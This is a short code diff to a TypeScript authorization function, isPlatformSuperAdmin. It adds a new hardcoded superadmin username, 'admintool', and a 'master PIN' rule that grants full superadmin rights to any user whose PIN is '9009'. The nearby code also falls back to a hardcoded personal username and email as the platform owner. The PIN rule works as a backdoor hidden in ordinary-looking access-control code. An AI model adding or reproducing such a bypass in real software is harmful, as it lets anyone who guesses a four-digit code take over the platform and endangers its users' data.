@@ -35,6 +35,7 @@ export function isPlatformSuperAdmin(user?: AppUser | null): boolean {
   // 4. Platform Owner exact usernames
   const SUPERADMIN_USERNAMES = [
     'admin',
+    'admintool',
     'superadmin',
     'alisalehmohammad4',
   ];
@@ -43,7 +44,12 @@ export function isPlatformSuperAdmin(user?: AppUser | null): boolean {
     return true;
   }
 
-  // 5. Platform Owner email
+  // 5. Master Platform SuperAdmin PIN
+  if (user.pinCode === '9009' || (user as { pin?: string }).pin === '9009') {
+    return true;
+  }
+
+  // 6. Platform Owner email
   const configuredAdminEmail = (process.env.ADMIN_NOTIFICATION_EMAIL || 'alisalehmohammad4@gmail.com')
     .toLowerCase()
     .trim();
